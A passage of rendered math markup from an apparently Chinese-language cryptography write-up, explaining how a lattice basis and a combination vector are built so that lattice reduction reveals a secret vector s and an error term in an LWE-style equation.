class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5513309999999998em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.051331em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathbf">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">′</span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.305331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">I</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.25833100000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8086690000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathbf">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathbf mtight">′</span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999998em;"><span style="top:-2.451892em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30643899999999996em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5513309999999998em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.051331em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">0</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">×</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">0</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">×</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8086690000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5513309999999998em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width='0.875em' height='0.3em' style='width:0.875em' viewBox='0 0 875 300' preserveAspectRatio='xMinYMin'><path d='M457 0 H583 V300 H457 z'/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>S</mi><mtext>：这里为什么取的是转置矩阵呢？因为矩阵乘法的规定是行乘列</mtext></mrow><annotation encoding="application/x-tex">PS：这里为什么取的是转置矩阵呢？因为矩阵乘法的规定是行乘列</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">什</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">转</span><span class="mord cjk_fallback">置</span><span class="mord cjk_fallback">矩</span><span class="mord cjk_fallback">阵</span><span class="mord cjk_fallback">呢</span><span class="mord cjk_fallback">？</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">矩</span><span class="mord cjk_fallback">阵</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">规</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">列</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>取一个组合向量</mtext><mi>c</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>s</mi><mn>0</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>35</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>0</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>k</mi><mn>49</mn></msub><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>，计算目标向量</mtext><mi>v</mi><mo>=</mo><mi>c</mi><mo>⋅</mo><mi>L</mi></mrow><annotation encoding="application/x-tex">取一个组合向量c=(s_{0},...,s_{35},k_{0},...,k_{49},1)，计算目标向量v=c\cdot L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">目</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>n</mi></msub><mtext>为单位矩阵，则</mtext><mi>v</mi><mtext>的前</mtext><mi>n</mi><mtext>个分量为</mtext><mo stretchy="false">(</mo><msub><mi>s</mi><mn>0</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>35</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I_{n}为单位矩阵，则v的前n个分量为(s_{0},...,s_{35})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">矩</span><span class="mord cjk_fallback">阵</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">前</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">为</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>最后一个分量为</mtext><mn>1</mn><mtext>，可以通过它来判断规约出来目标向量是否是我们想要的向量</mtext></mrow><annotation encoding="application/x-tex">最后一个分量为1，可以通过它来判断规约出来目标向量是否是我们想要的向量</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">为</span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">它</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">规</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">目</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">想</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>中间</mtext><mi>m</mi><mtext>个分量，第</mtext><mi>i</mi><mtext>个分量是</mtext><mo stretchy="false">(</mo><mi>s</mi><mo>∗</mo><msup><mi>A</mi><mrow><mo mathvariant="normal">′</mo><mi>T</mi></mrow></msup><msub><mo stretchy="false">)</mo><mi>i</mi></msub><mo>+</mo><mo stretchy="false">(</mo><mi>k</mi><mo>∗</mo><mi>p</mi><mi>I</mi><msub><mo stretchy="false">)</mo><mi>i</mi></msub><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>∗</mo><mo>−</mo><msup><mi>b</mi><mrow><mo mathvariant="normal">′</mo><mi>T</mi></mrow></msup><msub><mo stretchy="false">)</mo><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">中间m个分量，第i个分量是(s * A&#x27;^T)_i + (k * pI)_i + (1 * -b&#x27;^T)_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">间</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">第</span><span class="mord mathnormal">i</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">是</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>也就是，</mtext><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msubsup><msubsup><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>⋅</mo><msub><mi>s</mi><mi>j</mi></msub><mo>−</mo><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>+</mo><msub><mi>k</mi><mi>i</mi></msub><mi>p</mi><mo>=</mo><mo>−</mo><msub><mi>e</mi><mi>i</mi></msub><mo>+</mo><msub><mi>K</mi><mi>i</mi></msub><mi>p</mi><mo>+</mo><msub><mi>k</mi><mi>i</mi></msub><mi>p</mi></mrow><annotation encoding="application/x-tex">也就是，\sum_{j=0}^{n-1}A&#x27;_{i,j}\cdot s_{j}-b&#x27;_{i}+k_{i}p=-e_{i}+K_{i}p+k_{i}p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.389826em;vertical-align:-0.43581800000000004em;"></span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.010556em;vertical-align:-0.258664em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span 